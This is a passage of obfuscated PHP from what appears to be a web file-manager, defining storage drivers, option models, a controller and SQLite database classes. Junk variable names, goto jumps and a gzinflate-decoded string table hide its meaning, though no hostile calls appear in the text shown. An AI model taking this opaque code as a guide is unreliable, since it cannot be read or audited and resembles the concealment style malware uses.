$this->pathParse[$ˆÚöšô[1280]] . $ˆÚöšô[8] . ltrim($Ø˜¼•ñÍ, $ˆÚöšô[8]); } public function getType() { $Ù»˜³Ç© =& $_SERVER[Î·Ü›öğ]; $·è°Åƒ° = str_replace($Ù»˜³Ç©[77], $Ù»˜³Ç©[12], get_class($this)); return strtolower($·è°Åƒ°); } public function isOsDriver($Í•§í½) { return IO::isOsDriver($Í•§í½); } public function info($³È Æ¹õ) { return $this->infoParse($³È Æ¹õ); } public function infoAuth($Œœò¨) { return $this->infoParse($Œœò¨); } public function infoWithChildren($¬ı–¿·ö) { return $this->infoParse($¬ı–¿·ö, !0); } public function infoFull($Ÿıò–á·) { return $this->infoParse($Ÿıò–á·); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Îœ¦ï¬) { $this->pathParse = $Îœ¦ï¬; } protected function infoParse($á½ŒÓĞ¬, $ùğµîµ’ = false) { $ğàúíŒ´ =& $_SERVER[Î·Ü›öğ]; return Action($ğàúíŒ´[1286])->sharePathInfo($this->pathParse[$ğàúíŒ´[87]], !0, $ùğµîµ’); } public function listPath($ñç§ë, $ıÀà²¥ª = false) { $š®œ¶· =& $_SERVER[Î·Ü›öğ]; $öòºÜç = IO::listPath($ñç§ë, $ıÀà²¥ª); if (!$öòºÜç) { return $öòºÜç; } if (is_array($öòºÜç[$š®œ¶·[1466]])) { $°–Õ÷­ä = Action($š®œ¶·[1475])->parsePathChildren($öòºÜç[$š®œ¶·[1466]], array($š®œ¶·[506] => $ñç§ë)); $öòºÜç[$š®œ¶·[1466]] = Action($š®œ¶·[1286])->shareItemInfo($°–Õ÷­ä); } foreach ($öòºÜç as $×Ò¥Äü„ => $Ñ¦«’³è) { if (!in_array($×Ò¥Äü„, array($š®œ¶·[86], $š®œ¶·[85]))) { continue; } foreach ($Ñ¦«’³è as $Ø¿ùšÜœ => $°–Õ÷­ä) { $°–Õ÷­ä = Action($š®œ¶·[1475])->parsePathChildren($°–Õ÷­ä, array($š®œ¶·[506] => $ñç§ë)); $öòºÜç[$×Ò¥Äü„][$Ø¿ùšÜœ] = Action($š®œ¶·[1286])->shareItemInfo($°–Õ÷­ä); } } return $öòºÜç; } } goto Eâ­óÍèâ®; Bòºù”„ï: define($_SERVER[Î·Ü›öğ][0], $_SERVER[Î·Ü›öğ][1]); $_SERVER[¯ÜüøÑ­] = explode($_SERVER[Î·Ü›öğ][2], gzinflate(substr($_SERVER[Î·Ü›öğ][3], 10, -8))); function binCheckEq($Ş­¡‹ı—, $»ç°ÇŒ¸) { return $Ş­¡‹ı— == $»ç°ÇŒ¸; } goto dİ†Ê«©; dõŒğğ„ª: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($çåşÃçÉ) { $ÛÂø÷Í =& $_SERVER[Î·Ü›öğ]; parent::__construct($çåşÃçÉ); $ËùÅ¸íü = isset($çåşÃçÉ[$ÛÂø÷Í[259]]) && $çåşÃçÉ[$ÛÂø÷Í[259]] == $ÛÂø÷Í[250] ? $ÛÂø÷Í[250] : $ÛÂø÷Í[316]; $this->setSignVersion($ËùÅ¸íü); } public function link($ƒì¯ì, $ßçøğŸÅ = array()) { return parent::link($ƒì¯ì, $ßçøğŸÅ); } public function fileOut($ûÖ›¹•š, $Ê££ñÇô = false, $Ãš´ÍÚ = false, $Ü±ñåé‘ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Î·Ü›öğ][317])) { return parent::fileOutServer($ûÖ›¹•š, $Ê££ñÇô, $Ãš´ÍÚ, $Ü±ñåé‘); } parent::fileOut($ûÖ›¹•š, $Ê££ñÇô, $Ãš´ÍÚ, $Ü±ñåé‘); } public function fileOutImage($®Ÿ§Êœ¥, $Ã‡ÚıÒ = 250) { if (strstr($this->endpoint, $_SERVER[Î·Ü›öğ][317])) { return parent::fileOutImageServer($®Ÿ§Êœ¥, $Ã‡ÚıÒ); } parent::fileOutImage($®Ÿ§Êœ¥, $Ã‡ÚıÒ); } } define($_SERVER[Î·Ü›öğ][318], 1); define($_SERVER[Î·Ü›öğ][319], 2); goto a½™ÈºÏ; bŠ¥Ó±Ïå: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\145\155\x4f\160\164\x69\x6f\156"; public $field = array(); public function listData($ä¬£»¯™ = false, $ Ù¡ıÜ½ = "\155\x6f\144\x69\146\171\124\x69\x6d\145", $ø¿æéÒÏ = false) { $‘ŞÜãç– =& $_SERVER[Î·Ü›öğ]; $­ÃÈçö½ = Model($this->modelType)->get(!1, $this->optionType, !0); $ó¬‚Æ³Š = array_values($­ÃÈçö½); if ($ó¬‚Æ³Š && $ó¬‚Æ³Š[0] && !is_array($ó¬‚Æ³Š[0])) { Model($this->modelType)->cacheRemove($this->optionType); $­ÃÈçö½ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$­ÃÈçö½) { return $ä¬£»¯™ ? null : array(); } if (!$ä¬£»¯™ && $ä¬£»¯™ !== $‘ŞÜãç–[231]) { $­ÃÈçö½ = array_filter(array_values($­ÃÈçö½)); return array_sort_by($­ÃÈçö½, $ Ù¡ıÜ½, $ø¿æéÒÏ); } return $­ÃÈçö½[$‘ŞÜãç–[474] . $ä¬£»¯™]; } public function insert($ÈÆÏ†ı†) { $§ß•‹• =& $_SERVER[Î·Ü›öğ]; $ÈÆÏ†ı† = array_field_key($ÈÆÏ†ı†, $this->field); $Ã‡¶Á‹¥ = Model($this->modelType)->get($§ß•‹•[475], $this->optionType . $§ß•‹•[476]); $Ã‡¶Á‹¥ = $Ã‡¶Á‹¥ ? $Ã‡¶Á‹¥ : 0; $ÈÆÏ†ı†[$§ß•‹•[477]] = ++$Ã‡¶Á‹¥; $ÈÆÏ†ı†[$§ß•‹•[234]] = time(); $ÈÆÏ†ı†[$§ß•‹•[88]] = time(); Model($this->modelType)->set($§ß•‹•[475], $Ã‡¶Á‹¥, $this->optionType . $§ß•‹•[476]); Model($this->modelType)->set($§ß•‹•[474] . $Ã‡¶Á‹¥, $ÈÆÏ†ı†, $this->optionType); return $Ã‡¶Á‹¥; } public function update($Íáª©¼â, $Ş¨Ü­÷ë) { $¥ÑˆË…˜ =& $_SERVER[Î·Ü›öğ]; $Ş¨Ü­÷ë = array_field_key($Ş¨Ü­÷ë, $this->field); $Ú»Í’‰í = $this->listData($Íáª©¼â); if (!$Ú»Í’‰í || !$Íáª©¼â) { return !1; } $Ş¨Ü­÷ë = array_merge($Ú»Í’‰í, $Ş¨Ü­÷ë); $Ş¨Ü­÷ë[$¥ÑˆË…˜[88]] = time(); return Model($this->modelType)->set($¥ÑˆË…˜[474] . $Íáª©¼â, $Ş¨Ü­÷ë, $this->optionType); } public function remove($ò¸ßì‡¯) { if (!$ò¸ßì‡¯) { return !1; } return Model($this->modelType)->remove($_SERVER[Î·Ü›öğ][474] . $ò¸ßì‡¯, $this->optionType); } public function clear() { $óõñ„ëƒ =& $_SERVER[Î·Ü›öğ]; Model($this->modelType)->remove($óõñ„ëƒ[475], $this->optionType . $óõñ„ëƒ[476]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($œŒËœ¾, $Ìñ­¶îÈ) { if (!$Ìñ­¶îÈ) { return !1; } $ªÒÏ Œ¢ = $this->listData(); $ªÒÏ Œ¢ = array_to_keyvalue($ªÒÏ Œ¢, $œŒËœ¾); return isset($ªÒÏ Œ¢[$Ìñ­¶îÈ]) ? $ªÒÏ Œ¢[$Ìñ­¶îÈ] : !1; } public function findByName($¢ÅµÏ–ª) { return $this->findByKey($_SERVER[Î·Ü›öğ][32], $¢ÅµÏ–ª); } protected function resetData($Ñ­ûŠÏğ) { $ âÔóƒ× =& $_SERVER[Î·Ü›öğ]; $Ñ­ûŠÏğ = is_array($Ñ­ûŠÏğ) ? $Ñ­ûŠÏğ : array(); $Äó™ù = array(); for ($óö¥ÁØÓ = 0; $óö¥ÁØÓ < count($Ñ­ûŠÏğ); $óö¥ÁØÓ++) { $Äó™ù[$ âÔóƒ×[474] . $Ñ­ûŠÏğ[$óö¥ÁØÓ][$ âÔóƒ×[477]]] = $Ñ­ûŠÏğ[$óö¥ÁØÓ]; } return Model($this->modelType)->set($Äó™ù, !1, $this->optionType); } private function getAutoName($Ÿ®ÛâÌ) { $”Ç¤ûğì = array_to_keyvalue($this->listData(), $_SERVER[Î·Ü›öğ][32]); if (!$”Ç¤ûğì || !isset($”Ç¤ûğì[$Ÿ®ÛâÌ])) { return $Ÿ®ÛâÌ; } for ($µ›…æ–í = 1; $µ›…æ–í < count($”Ç¤ûğì); $µ›…æ–í++) { $ùÏÒ–™Ä = $Ÿ®ÛâÌ . "\x28{$µ›…æ–í}\51"; if (!isset($”Ç¤ûğì[$ùÏÒ–™Ä])) { return $ùÏÒ–™Ä; } } return $ùÏÒ–™Ä; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Ø·Âïœî = false, $ŞÊÜ‹œª = '', $³™ß¡æ• = false) { $ÏÉ·áº… =& $_SERVER[Î·Ü›öğ]; $ƒ¬ÈÙÒ£ = $this->cacheGet($ŞÊÜ‹œª); $ËÃõ»Ú… = $this->optionDefault($ŞÊÜ‹œª); $ËÃõ»Ú… = is_array($ËÃõ»Ú…) ? $ËÃõ»Ú… : array(); if (is_array($ƒ¬ÈÙÒ£)) { $ƒ¬ÈÙÒ£ = array_merge($ËÃõ»Ú…, $ƒ¬ÈÙÒ£); return $Ø·Âïœî ? isset($ƒ¬ÈÙÒ£[$Ø·Âïœî]) ? $ƒ¬ÈÙÒ£[$Ø·Âïœî] : null : $ƒ¬ÈÙÒ£; } $´ëœú‰ˆ = $this->filterWhere(array($ÏÉ·áº…[33] => $ŞÊÜ‹œª)); $ƒ¬ÈÙÒ£ = $this->where($´ëœú‰ˆ)->select(); $ƒ¬ÈÙÒ£ = array_to_keyvalue($ƒ¬ÈÙÒ£, $ÏÉ·áº…[97], $ÏÉ·áº…[452]); foreach ($ƒ¬ÈÙÒ£ as $² Œ÷„ƒ => $èäİ¿Ş) { if ($³™ß¡æ• || in_array($² Œ÷„ƒ, $this->jsonField)) { $ƒ¬ÈÙÒ£[$² Œ÷„ƒ] = json_decode($èäİ¿Ş, !0); } } $this->cacheSet($ŞÊÜ‹œª, $ƒ¬ÈÙÒ£); $ƒ¬ÈÙÒ£ = array_merge($ËÃõ»Ú…, $ƒ¬ÈÙÒ£); return $Ø·Âïœî ? $ƒ¬ÈÙÒ£[$Ø·Âïœî] : $ƒ¬ÈÙÒ£; } public function set($¡œÚÔ·, $ûóÕ¡± = false, $¡Øò‰¬À = '') { $ª’œµ•¤ =& $_SERVER[Î·Ü›öğ]; $this->cacheRemove($¡Øò‰¬À); $ŸÀ—¥Ñ± = array(); $»ò°Ì¬õ = is_array($¡œÚÔ·) ? $¡œÚÔ· : array($¡œÚÔ· => $ûóÕ¡±); foreach ($»ò°Ì¬õ as $Ì›ñ ŞÙ => $ÕóÓ»¡) { if (is_array($ÕóÓ»¡)) { $ÕóÓ»¡ = json_encode_force($ÕóÓ»¡); } $this->checkLength($ÕóÓ»¡, !1, $this->tableName . $ª’œµ•¤[4] . $¡œÚÔ·); $ÕóÓ»¡ = self::textEncode($ÕóÓ»¡); $»ò°Ì¬õ = array($ª’œµ•¤[33] => $¡Øò‰¬À, $ª’œµ•¤[97] => $Ì›ñ ŞÙ, $ª’œµ•¤[452] => $ÕóÓ»¡); $ŸÀ—¥Ñ±[] = $this->filterWhere($»ò°Ì¬õ); } if (!$ŸÀ—¥Ñ±) { return !0; } $÷ú¸÷É™ = $this->cacheKey($ª’œµ•¤[478]); CacheLock::lock($÷ú¸÷É™); $šåµ­ºÂ = $this->addAll($ŸÀ—¥Ñ±, array(), !0); CacheLock::unlock($÷ú¸÷É™); return $šåµ­ºÂ; } protected function optionDefault($Ä¶ë‡÷ = '') { return !1; } public function setDeep($ïÆı¤¾Ñ, $ØíöÊ¡ = false, $“™„¥¶„ = '') { $ä¶íÜöù = explode($_SERVER[Î·Ü›öğ][10], $ïÆı¤¾Ñ); $œËŸ†ùˆ = $this->get(); array_set_value($œËŸ†ùˆ, $ïÆı¤¾Ñ, $ØíöÊ¡); $this->set($ä¶íÜöù[0], $œËŸ†ùˆ[$ä¶íÜöù[0]], $“™„¥¶„); } public function remove($€Ï’éñé, $÷ãã‹ = '') { $Ò¨Òôå» =& $_SERVER[Î·Ü›öğ]; $this->cacheRemove($÷ãã‹); $Öñïãó” = $this->filterWhere(array($Ò¨Òôå»[97] => $€Ï’éñé, $Ò¨Òôå»[33] => $÷ãã‹)); if (is_null($€Ï’éñé)) { unset($Öñïãó”[$Ò¨Òôå»[97]]); } return $this->where($Öñïãó”)->delete(); } public function cacheSet($âßäîß, $’ˆ“…©• = false) { return Cache::set($this->cacheKey($âßäîß), $’ˆ“…©•); } public function cacheGet($ÇœñŠ¸å) { return Cache::get($this->cacheKey($ÇœñŠ¸å)); } public function cacheRemove($÷ú¤øöğ) { return Cache::remove($this->cacheKey($÷ú¤øöğ)); } protected function filterWhere($×Ÿ¼•£Á) { return $×Ÿ¼•£Á; } protected function cacheKey($©ï‰·¦) { return $©ï‰·¦; } } $_file = $_SERVER[$_SERVER[Î·Ü›öğ][479]]; goto e–õ…©ÇÙ®; B„†‡ĞµÚÄ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $œî£Ü¾û =& $_SERVER[Î·Ü›öğ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$œî£Ü¾û[6]] =& $config; $this->values[$œî£Ü¾û[7]] =& $in; $this->tpl = TEMPLATE . MOD . $œî£Ü¾û[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ö½‚êÚà) { if (1 === func_num_args()) { $this->{$ö½‚êÚà} = new $ö½‚êÚà(); } else { $”¶™±À = new ReflectionClass($ö½‚êÚà); $ş®²›Ò = func_get_args(); array_shift($ş®²›Ò); $this->{$ö½‚êÚà} = $”¶™±À->newInstanceArgs($ş®²›Ò); } return $this->{$ö½‚êÚà}; } public function routeBind($ı©»½æí, $áæÀ„ùó, $ë…œæ” = 3) { $´ˆ’È™Ä =& $_SERVER[Î·Ü›öğ]; $Ë‰È¦´à = $this->in[$´ˆ’È™Ä[9]]; $ı©»½æí = str_replace($´ˆ’È™Ä[10], $´ˆ’È™Ä[11], trim(trim($ı©»½æí, $´ˆ’È™Ä[8]), $´ˆ’È™Ä[12])); if (!$ı©»½æí || count($Ë‰È¦´à) <= $ë…œæ”) { return !1; } $Çó²—“ = !0; $‚ãŞˆõŞ = explode($´ˆ’È™Ä[8], $ı©»½æí); for ($˜Œ€ÑÏ¹ = 0; $˜Œ€ÑÏ¹ < count($‚ãŞˆõŞ); $˜Œ€ÑÏ¹++) { if ($‚ãŞˆõŞ[$˜Œ€ÑÏ¹] != $Ë‰È¦´à[$ë…œæ” + $˜Œ€ÑÏ¹]) { $Çó²—“ = !1; break; } } if (!$Çó²—“) { return; } call_user_func_array(array($this, $áæÀ„ùó), array()); } public function routeArgs($ò“ŸÊû = 3) { $‘€åÕ¾ = $this->in[$_SERVER[Î·Ü›öğ][9]]; if (count($‘€åÕ¾) <= $ò“ŸÊû) { return array(); } $œ‡ú®¶´ = array(); for ($£ŞÏ‘¤ = $ò“ŸÊû; $£ŞÏ‘¤ < count($‘€åÕ¾); $£ŞÏ‘¤ += 2) { $œ‡ú®¶´[$‘€åÕ¾[$£ŞÏ‘¤]] = $‘€åÕ¾[$£ŞÏ‘¤ + 1]; $this->in[$‘€åÕ¾[$£ŞÏ‘¤]] = $‘€åÕ¾[$£ŞÏ‘¤ + 1]; } return $œ‡ú®¶´; } protected function assign($ºŒ¡âŒÕ, $ÄÄÜƒ) { $this->values[$ºŒ¡âŒÕ] = $ÄÄÜƒ; } protected function display($à¸ƒÌåÅ) { ob_end_clean(); extract($this->values); require $this->tpl . $à¸ƒÌåÅ; } } class DbSqliteBase extends Db { public function __construct($©¡”êœË = '') { $ƒß»ô¬ =& $_SERVER[Î·Ü›öğ]; if (!extension_loaded($ƒß»ô¬[13])) { think_exception(think_lang($ƒß»ô¬[14]) . $ƒß»ô¬[15]); } if (!empty($©¡”êœË)) { if (!isset($©¡”êœË[$ƒß»ô¬[16]])) { $©¡”êœË[$ƒß»ô¬[16]] = 438; } $this->config = $©¡”êœË; if (empty($this->config[$ƒß»ô¬[17]])) { $this->config[$ƒß»ô¬[17]] = array(); } } } public function connect($°—ŒúŒ• = '', $‹à®óÄ› = 0) { $°°õ†õË =& $_SERVER[Î·Ü›öğ]; if (!isset($this->linkID[$‹à®óÄ›])) { if (empty($°—ŒúŒ•)) { $°—ŒúŒ• = $this->config; } $‘®¾¹·† = !empty($°—ŒúŒ•[$°°õ†õË[17]][$°°õ†õË[18]]) ? $°—ŒúŒ•[$°°õ†õË[17]][$°°õ†õË[18]] : $this->pconnect; $¡÷·« = $‘®¾¹·† ? $°°õ†õË[19] : $°°õ†õË[20]; $this->linkID[$‹à®óÄ›] = $¡÷·«($°—ŒúŒ•[$°°õ†õË[21]], $°—ŒúŒ•[$°°õ†õË[16]]); if (!$this->linkID[$‹à®óÄ›]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$‹à®óÄ›], 30000); if (1 != think_config($°°õ†õË[22])) { unset($this->config); } } return $this->linkID[$‹à®óÄ›]; } public function free() { $this->queryID = null; } public function query($Êã”Ä€‚) { $Á‘³Îµ€ =& $_SERVER[Î·Ü›öğ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Êã”Ä€‚; if ($this->queryID) { $this->free(); } think_action_status($Á‘³Îµ€[23], 1); think_status($Á‘³Îµ€[24]); $this->queryID = sqlite_query($this->_linkID, $Êã”Ä€‚); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $à©˜ÎºÓ = $this->getAll(); return $à©˜ÎºÓ; } } public function execute($Ğ½ÇÂŞÃ) { $íÍ¨êİ™ =& $_SERVER[Î·Ü›öğ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ğ½ÇÂŞÃ; if ($this->queryID) { $this->free(); } think_action_status($íÍ¨êİ™[25], 1); think_status($íÍ¨êİ™[24]); $Óæ´¦ùØ = sqlite_exec($this->_linkID, $Ğ½ÇÂŞÃ); $this->debug(); if (!1 === $Óæ´¦ùØ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Î·Ü›öğ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ããğ…¦Ä = sqlite_query($this->_linkID, $_SERVER[Î·Ü›öğ][27]); if (!$Ããğ…¦Ä) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $–ü‹¬è’ = sqlite_query($this->_linkID, $_SERVER[Î·Ü›öğ][28]); if (!$–ü‹¬è’) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $§¤¢¬Ÿ = array(); if ($this->numRows > 0) { for ($Îı¥õÛÖ = 0; $Îı¥õÛÖ < $this->numRows; $Îı¥õÛÖ++) { $§¤¢¬Ÿ[$Îı¥õÛÖ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $§¤¢¬Ÿ; } public function getFields($§ˆï£Õ†) { $ğÙ©ëËâ =& $_SERVER[Î·Ü›öğ]; $—…ó§ê— = $this->query($ğÙ©ëËâ[29] . $§ˆï£Õ† . $ğÙ©ëËâ[30]); $è…ºÓĞá = array(); if ($—…ó§ê—) { foreach ($—…ó§ê— as $±Îô‘Íç => $Ë¼ å³Ì) { $è…ºÓĞá[$Ë¼ å³Ì[$ğÙ©ëËâ[31]]] = array($ğÙ©ëËâ[32] => $Ë¼ å³Ì[$ğÙ©ëËâ[31]], $ğÙ©ëËâ[33] => $Ë¼ å³Ì[$ğÙ©ëËâ[34]], $ğÙ©ëËâ[35] => (bool) ($Ë¼ å³Ì[$ğÙ©ëËâ[36]] === $ğÙ©ëËâ[12]), $ğÙ©ëËâ[37] => $Ë¼ å³Ì[$ğÙ©ëËâ[38]], $ğÙ©ëËâ[39] => strtolower($Ë¼ å³Ì[$ğÙ©ëËâ[40]]) == $ğÙ©ëËâ[41], $ğÙ©ëËâ[42] => strtolower($Ë¼ å³Ì[$ğÙ©ëËâ[43]]) == $ğÙ©ëËâ[44]); } } return $è…ºÓĞá; } public function getTables($ôÚÔ¬Ô¤ = '') { $óç˜èüš =& $_SERVER[Î·Ü›öğ]; $Ì·ĞÃÒ‹ = $this->query($óç˜èüš[45] . $óç˜èüš[46] . $óç˜èüš[47]); $©ß—ç·× = array(); foreach ($Ì·ĞÃÒ‹ as $‚å©›éÈ => $¢ç²Úãß) { $©ß—ç·×[$‚å©›éÈ] = current($¢ç²Úãß); } return $©ß—ç·×; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÇÙøÄÜœ =& $_SERVER[Î·Ü›öğ]; $Ùáçî£ = sqlite_last_error($this->_linkID); $this->error = $Ùáçî£ . $ÇÙøÄÜœ[4] . sqlite_error_string($Ùáçî£); if ($ÇÙøÄÜœ[12] != $this->queryStr) { $this->error .= LNG($ÇÙøÄÜœ[48]) . $this->queryStr; } think_trace($this->error, $ÇÙøÄÜœ[12], $ÇÙøÄÜœ[49]); return $this->error; } public function escapeString($ÄòÇº»±) { return sqlite_escape_string($ÄòÇº»±); } public function parseLimit($ÉÔ»úˆ) { $Åœæ³¯¢ =& $_SERVER[Î·Ü›öğ]; $”ÃÑë = $Åœæ³¯¢[12]; if (!empty($ÉÔ»úˆ)) { $ÉÔ»úˆ = explode($Åœæ³¯¢[50], $ÉÔ»úˆ); if (count($ÉÔ»úˆ) > 1) { $”ÃÑë .= $Åœæ³¯¢[51] . $ÉÔ»úˆ[1] . $Åœæ³¯¢[52] . $ÉÔ»úˆ[0] . $Åœæ³¯¢[53]; } else { $”ÃÑë .= $Åœæ³¯¢[51] . $ÉÔ»úˆ[0] . $Åœæ³¯¢[53]; } } return $”ÃÑë; } } class DbSqlite3Base extends Db { public function __construct($–À €‹ = '') { $öÆ†§íÅ =& $_SERVER[Î·Ü›öğ]; if (!class_exists($öÆ†§íÅ[54])) { think_exception(think_lang($öÆ†§íÅ[14]) . $öÆ†§íÅ[55]); } if (!empty($–À €‹)) { if (!isset($–À €‹[$öÆ†§íÅ[16]])) { $–À €‹[$öÆ†§íÅ[16]] = 438; } $this->config = $–À €‹; if (empty($this->config[$öÆ†§íÅ[17]])) { $this->config[$öÆ†§íÅ[17]] = array(); } } } public function connect($°çşï“ = '', $„Éàù = 0) { $ãÀÜ Ë =& $_SERVER[Î·Ü›öğ]; if (!isset($this->linkID[$„Éàù])) { if (empty($°çşï“)) { $°çşï“ = $this->config; } $this->linkID[$„Éàù] = new SQLite3($°çşï“[$ãÀÜ Ë[21]]); if (!$this->linkID[$„Éàù]) { think_exception($this->linkID[$„Éàù]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$„Éàù]->busyTimeout(30000); if (1 != think_config($ãÀÜ Ë[22])) { unset($this->config); } } return $this->linkID[$„Éàù]; } public function free() { $this->queryID = null; } public function query($Æı¶¼ø‡) { $Ì–®‚Ÿ =& $_SERVER[Î·Ü›öğ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Æı¶¼ø‡; if ($this->queryID) { $this->free(); } think_action_status($Ì–®‚Ÿ[23], 1); think_status($Ì–®‚Ÿ[24]); $this->queryID = $this->_linkID->query($Æı¶¼ø‡); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $îğšÓÛÃ = $this->getAll(); $this->numRows = count($îğšÓÛÃ); return $îğšÓÛÃ; } } public function execute($îòùûÜ) { $î›ìÁË =& $_SERVER[Î·Ü›öğ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $îòùûÜ; if ($this->queryID) { $this->free(); } think_action_status($î›ìÁË[25], 1); think_status($î›ìÁË[24]); $®™ı©Ë = $this->_linkID->exec($îòùûÜ); $this->debug(); if (!1 === $®™ı©Ë) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Î·Ü›öğ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $šü¬Šàú = $this->_linkID->query($_SERVER[Î·Ü›öğ][27]); if (!$šü¬Šàú) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¹¡æ®‘Ş = $this->_linkID->query($_SERVER[Î·Ü›öğ][28]); if (!$¹¡æ®‘Ş) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $²™âÔ³© = array(); while ($®ƒÑ²ô = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $²™âÔ³©[] = $®ƒÑ²ô; } $this->queryID->reset(); return $²™âÔ³©; } public function getFields($áÂäÔ‰) { $Ó‚Éã³± =& $_SERVER[Î·Ü›öğ]; $‡êÁ¨á = $this->query($Ó‚Éã³±[29] . $áÂäÔ‰ . $Ó‚Éã³±[30]); $î¦‘ò²® = array(); if ($‡êÁ¨á) { foreach ($‡êÁ¨á as $ëµâÖı­ => $ŸßØÆğÖ) { $î¦‘ò²®[$ŸßØÆğÖ[$Ó‚Éã³±[32]]] = array($Ó‚Éã³±[32] => $ŸßØÆğÖ[$Ó‚Éã³±[32]], $Ó‚Éã³±[33] => $ŸßØÆğÖ[$Ó‚Éã³±[33]], $Ó‚Éã³±[35] => (bool) ($ŸßØÆğÖ[$Ó‚Éã³±[35]] === $Ó‚Éã³±[12]), $Ó‚Éã³±[37] => $ŸßØÆğÖ[$Ó‚Éã³±[56]], $Ó‚Éã³±[39] => (bool) $ŸßØÆğÖ[$Ó‚Éã³±[57]], $Ó‚Éã³±[42] => (bool) $ŸßØÆğÖ[$Ó‚Éã³±[57]]); } } return $î¦‘ò²®; } public function getTables($ı•™¥Âù = '') { $¨–¡Åìİ =& $_SERVER[Î·Ü›öğ]; $÷ÚÏ˜ƒ² = $this->query($¨–¡Åìİ[45] . $¨–¡Åìİ[46] . $¨–¡Åìİ[47]); $ş«ÛğÜü = array(); foreach ($÷ÚÏ˜ƒ² as $ÌÂøğñ => $“³’òñ´) { $ş«ÛğÜü[$ÌÂøğñ] = current($“³’òñ´); } return $ş«ÛğÜü; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ûº³¢£® =& $_SERVER[Î·Ü›öğ]; $this->error = $this->_linkID->lastErrorMsg(); if ($ûº³¢£®[12] != $this->queryStr) { $this->error .= LNG($ûº³¢£®[48]) . $this->queryStr; } think_trace($this->error, $ûº³¢£®[12], $ûº³¢£®[49]); return $this->error; } public function escapeString($¡µæ÷Ğ£) { $ø‰•—ü• =& $_SERVER[Î·Ü›öğ]; if ($this->_linkID) { return $this->_linkID->escapeString($¡µæ÷Ğ£); } return str_ireplace($ø‰•—ü•[58], $ø‰•—ü•[59], $¡µæ÷Ğ£); } public function parseLimit($Æíƒˆ¸Ù) { $‹ß´Œ†š =& $_SERVER[Î·Ü›öğ]; $¦¹»Œá¬ = $‹ß´Œ†š[12]; if (!empty($Æíƒˆ¸Ù)) { $Æíƒˆ¸Ù = explode($‹ß´Œ†š[50], $Æíƒˆ¸Ù); if (count($Æíƒˆ¸Ù) > 1) { $¦¹»Œá¬ .= $‹ß´Œ†š[51] . $Æíƒˆ¸Ù[1] . $‹ß´Œ†š[52] . $Æíƒˆ¸Ù[0] . $‹ß´Œ†š[53]; } else { $¦¹»Œá¬ .= $‹ß´Œ†š[51] . $Æíƒˆ¸Ù[0] . $‹ß´Œ†š[53]; } } return $¦¹»Œá¬; } } goto c¢àõ¹ÉÌã; a½™ÈºÏ: define($_SERVER[Î·Ü›öğ][320], 3); define($_SERVER[Î·Ü›öğ][321], 1); define($_SERVER[Î·Ü›öğ][322], 0); goto D‹Àš±¤è˜; Añ»©˜Îà: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($‰²éÄ®õ) { $´„ØèÊ =& $_SERVER[Î·Ü›öğ]; return array($´„ØèÊ[2125] => array($´„ØèÊ[2565] . USER_ID, $´„ØèÊ[2126])); } protected function listData() { $ë×íÚò  =& $_SERVER[Î·Ü›öğ]; $Š¯¡‡é¶ = array($ë×íÚò [1801] => USER_ID, $ë×íÚò [570] => array($ë×íÚò [2129], 0)); $²³¤óƒ = $ë×íÚò [2566]; $‹ŒÚ÷«ˆ = $this->field($²³¤óƒ)->where($Š¯¡‡é¶)->order($ë×íÚò [2131])->select(); return $‹ŒÚ÷«ˆ ? $‹ŒÚ÷«ˆ : array(); } protected function addToTag($¼ÀÕñø, $×²ÏÇŒ¢) { $‡åÆàò =& $_SERVER[Î·Ü›öğ]; if (!Model($‡åÆàò[2290])->listData($×²ÏÇŒ¢)) { return !1; } if (is_numeric($¼ÀÕñø)) { $‘©…¦ÖÊ = Model($‡åÆàò[922])->pathInfo($¼ÀÕñø); if (!$‘©…¦ÖÊ) { return !1; } } else { $‘©…¦ÖÊ = IO::infoSimple($¼ÀÕñø); if 